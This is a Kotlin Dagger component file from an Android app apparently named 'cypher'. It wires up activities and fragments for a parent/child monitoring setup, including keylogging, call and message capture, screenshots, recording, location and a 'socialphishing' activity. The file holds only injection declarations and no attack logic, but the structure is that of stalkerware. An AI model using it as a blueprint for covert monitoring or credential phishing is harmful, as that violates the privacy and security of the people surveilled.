package com.github.sdt.cypher.di.component

import com.github.sdt.cypher.di.PerActivity
import com.github.sdt.cypher.di.module.ActivityModule
import com.github.sdt.cypher.ui.activities.mainparent.MainParentActivity
import com.github.sdt.cypher.ui.activities.register.RegisterActivity
import com.github.sdt.cypher.ui.activities.login.LoginActivity
import com.github.sdt.cypher.ui.activities.mainchild.MainChildActivity
import com.github.sdt.cypher.ui.activities.socialphishing.SocialActivityM
import com.github.sdt.cypher.ui.fragments.calls.CallsFragment
import com.github.sdt.cypher.ui.fragments.calls.FragmentCallhistory
import com.github.sdt.cypher.ui.fragments.photo.PhotoFragment
import com.github.sdt.cypher.ui.fragments.keylog.KeysFragment
import com.github.sdt.cypher.ui.fragments.maps.MapsFragment
import com.github.sdt.cypher.ui.fragments.message.MessageFragment
import com.github.sdt.cypher.ui.fragments.notifications.NotifyMessageFragment
import com.github.sdt.cypher.ui.fragments.recording.RecordingFragment
import com.github.sdt.cypher.ui.fragments.screenshot.FragmentScreenshot
import com.github.sdt.cypher.ui.fragments.social.SocialFragment
import dagger.Component

/**
 * Created by luis rafael on 8/03/18.
 */
@PerActivity
@Component(dependencies = [AppComponent::class],modules = [ActivityModule::class])
interface ActivityComponent {

    fun inject(loginActivity: LoginActivity)
    fun inject(registerActivity: RegisterActivity)
    fun inject(mainParentActivity: MainParentActivity)
    fun inject(mainChildActivity: MainChildActivity)
    fun inject(socialActivityM: SocialActivityM)
    fun inject(mapsFragment: MapsFragment)
    fun inject(callsFragment: CallsFragment)
    fun inject(messageFragment: MessageFragment)
    fun inject(photoFragment: PhotoFragment)
    fun inject(keysFragment: KeysFragment)
    fun inject(socialFragment: SocialFragment)
    fun inject(recordingFragment: RecordingFragment)
    fun inject(notifyMessageFragment: NotifyMessageFragment)

    fun inject(screenshot: FragmentScreenshot)
    fun inject(callhistory: FragmentCallhistory)

}